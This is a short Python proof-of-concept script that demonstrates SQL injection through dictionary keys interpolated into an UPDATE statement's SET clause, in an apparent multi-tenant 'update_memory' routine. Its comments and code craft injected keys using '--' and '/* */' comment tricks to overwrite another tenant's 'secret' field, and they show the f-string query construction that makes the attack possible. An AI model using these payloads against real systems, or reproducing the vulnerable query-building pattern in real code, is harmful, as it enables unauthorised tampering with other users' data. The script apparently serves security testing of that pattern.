import sqlite3

db = sqlite3.connect(':memory:')
db.execute("CREATE TABLE test (id TEXT PRIMARY KEY, tenant TEXT, project_id TEXT, secret TEXT, role TEXT)")
db.execute("INSERT INTO test (id, tenant, project_id, secret, role) VALUES ('1', 't1', 'p1', 'safe', 'user')")
db.execute("INSERT INTO test (id, tenant, project_id, secret, role) VALUES ('2', 't2', 'p2', 'safe2', 'user2')")

# What if we want to change someone else's memory?
# For example, we want to update id '1', but we are only authorized for id '2'.
# Our call: update_memory("test", "2", {"secret": "hacked"}, "t2", "p2")
# But we maliciously craft the payload:
# updates = {"secret": "hacked"}
# query will be: UPDATE test SET secret = ? WHERE id = '2' AND tenant = 't2' AND project_id = 'p2'

# What if we pass key `secret = ? WHERE id = '1'; --` ?
updates = {"secret = 'hacked_1' WHERE id = '1'; --": "value"}
set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
query = f"UPDATE test SET {set_clause} WHERE id = ? AND tenant = ? AND project_id = ?"
# UPDATE test SET secret = 'hacked_1' WHERE id = '1'; -- = ? WHERE id = ? AND tenant = ? AND project_id = ?
# this gives error: Incorrect number of bindings supplied

# However, we can do this if we can make the statement correct:
updates = {"secret = 'hacked_1' WHERE id = '1'; /*": "value", "*/ secret ": "ignored"}
set_clause = ", ".join([f"{k} = ?" for k in updates.keys()])
query = f"UPDATE test SET {set_clause} WHERE id = ? AND tenant = ? AND project_id = ?"
print(f"Query: {query}")
try:
    db.execute(query, list(updates.values()) + ['2', 't2', 'p2'])
    print("Execution successful")
except Exception as e:
    print(f"Error: {e}")

cur = db.execute("SELECT * FROM test")
print(cur.fetchall())
